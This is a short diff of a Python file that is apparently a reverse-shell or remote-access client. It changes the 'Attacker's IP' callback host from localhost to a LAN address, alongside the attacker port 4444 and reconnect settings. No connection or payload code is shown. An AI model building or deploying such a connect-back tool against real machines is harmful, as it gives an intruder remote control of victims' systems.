@@ -7,7 +7,7 @@ import time
 import platform
 
 # Configuration
-HOST = '127.0.0.1'  # Attacker's IP
+HOST = '192.168.100.15'  # Attacker's IP
 PORT = 4444  # Attacker's port
 RECONNECT_DELAY = 5  # Seconds between connection attempts
 BUFFER_SIZE = 1024 * 128  # 128KB buffer size
